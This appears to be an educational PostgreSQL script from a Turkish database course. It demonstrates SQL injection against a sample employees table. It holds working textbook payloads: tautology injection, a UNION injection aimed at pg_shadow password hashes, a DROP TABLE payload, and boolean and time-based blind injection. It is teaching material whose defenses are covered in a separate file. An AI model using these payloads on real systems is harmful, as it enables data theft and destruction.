-- =====================================================
-- BLM4522 Proje 3: SQL Injection Demosu
-- DİKKAT: Bu dosya EĞİTİM AMAÇLIDIR!
-- Gerçek uygulamalarda ASLA bu şekilde sorgu yazmayın!
-- =====================================================

\echo '=============================='
\echo '  SQL INJECTION DEMO'
\echo '  (Eğitim Amaçlı)'
\echo '=============================='

-- =====================================================
-- 1. SAVUNMASIZ SORGU ÖRNEĞİ (String Concatenation)
-- =====================================================

\echo ''
\echo '=== 1. SAVUNMASIZ SORGU ==='
\echo ''
\echo 'Normal kullanım: Kullanıcı "ahmet.yilmaz" arar'

-- Normal kullanım (güvenli girdi)
SELECT emp_id, first_name, last_name, email
FROM employees
WHERE email = 'ahmet.yilmaz@sirket.com';

-- Simüle edilmiş SQL Injection saldırısı
-- Bir uygulamada şöyle bir sorgu düşünün:
-- query = "SELECT * FROM employees WHERE email = '" + user_input + "'"
-- Saldırgan şunu girer: ' OR '1'='1

\echo ''
\echo 'SQL Injection saldırısı: '' OR ''1''=''1'
\echo 'Bu tüm kayıtları döndürür!'

SELECT emp_id, first_name, last_name, email, salary
FROM employees
WHERE email = '' OR '1'='1'
LIMIT 10;

\echo ''
\echo 'Toplam dönen kayıt:'
SELECT COUNT(*) AS injection_sonucu FROM employees WHERE email = '' OR '1'='1';

-- =====================================================
-- 2. UNION BASED SQL INJECTION
-- =====================================================

\echo ''
\echo '=== 2. UNION BASED INJECTION ==='
\echo ''
\echo 'Saldırgan sistem tablolarını okumaya çalışıyor:'

-- Saldırgan: ' UNION SELECT usename, passwd, null, null, null FROM pg_shadow --
-- Bu sistem kullanıcılarının hash'lerini çeker

SELECT username, role FROM user_accounts
WHERE username = ''
UNION
SELECT usename::text, 'SYSTEM_USER' FROM pg_user
LIMIT 5;

\echo ''
\echo 'DİKKAT: Saldırgan veritabanı kullanıcılarını görebildi!'

-- =====================================================
-- 3. DELETE / DROP INJECTION
-- =====================================================

\echo ''
\echo '=== 3. YIKICI INJECTION (Simülasyon) ==='
\echo ''
\echo 'Saldırgan: ''; DROP TABLE login_attempts; --'
\echo '(Bu demo''da gerçekten çalıştırmıyoruz)'
\echo ''
\echo 'Eğer uygulama şöyle yazılmışsa:'
\echo '  query = "SELECT * FROM users WHERE name=''" + input + "''"'
\echo ''
\echo 'Saldırgan input: ''; DROP TABLE users; --'
\echo 'Oluşan sorgu: SELECT * FROM users WHERE name=''''; DROP TABLE users; --'''
\echo 'Bu TABLO SİLMEYE yol açar!'

-- =====================================================
-- 4. BLIND SQL INJECTION
-- =====================================================

\echo ''
\echo '=== 4. BLIND SQL INJECTION ==='
\echo ''
\echo 'Saldırgan veri var/yok kontrolü yapıyor:'

-- Boolean-based blind injection
-- Saldırgan: admin' AND (SELECT COUNT(*) FROM pg_tables) > 0 --
SELECT CASE
    WHEN EXISTS (
        SELECT 1 FROM employees
        WHERE email = 'ahmet.yilmaz@sirket.com'
        AND (SELECT COUNT(*) FROM pg_tables) > 0
    )
    THEN 'Veritabanında tablolar VAR (bilgi sızdı!)'
    ELSE 'Bilgi alınamadı'
END AS blind_injection_sonucu;

-- Time-based blind injection açıklaması
\echo ''
\echo 'Time-based Blind Injection:'
\echo '  Saldırgan: '' OR pg_sleep(5) --'
\echo '  Eğer sayfa 5 saniye gecikirse → injection çalışıyor'

\echo ''
\echo '=============================='
\echo '  INJECTION SALDIRI DEMOLARİ'
\echo '  BİTTİ'
\echo ''
\echo '  SONRAKI ADIM: 06-sql-injection-safe.sql'
\echo '  ile korunma yöntemlerini göreceğiz'
\echo '=============================='
